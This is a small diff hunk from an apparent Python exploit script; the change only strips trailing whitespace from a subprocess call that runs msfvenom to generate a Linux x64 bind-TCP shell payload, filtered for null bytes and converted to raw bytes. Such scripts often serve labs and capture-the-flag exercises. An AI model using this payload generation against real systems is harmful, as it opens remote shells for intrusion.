@@ -4,7 +4,7 @@ from struct import pack
 
 cp = sp.run(
     "msfvenom --platform linux --arch x64 --bad-chars '\\x00' " +
-    "--payload linux/x64/shell/bind_tcp --format hex", 
+    "--payload linux/x64/shell/bind_tcp --format hex",
     stdout=sp.PIPE, stderr=sp.PIPE, shell=True, check=True
 )
 buf = bytes.fromhex(cp.stdout.decode())
